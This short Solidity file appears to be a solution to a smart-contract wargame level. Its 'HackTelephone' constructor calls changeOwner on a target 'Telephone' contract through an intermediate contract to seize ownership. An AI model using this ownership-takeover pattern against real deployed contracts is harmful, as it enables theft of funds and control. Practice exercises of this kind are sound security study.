interface Telephone {
    function changeOwner(address _owner) external;
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract HackTelephone {
    constructor (address telephone, address newOwner) {
        Telephone(telephone).changeOwner(newOwner);
    }
}
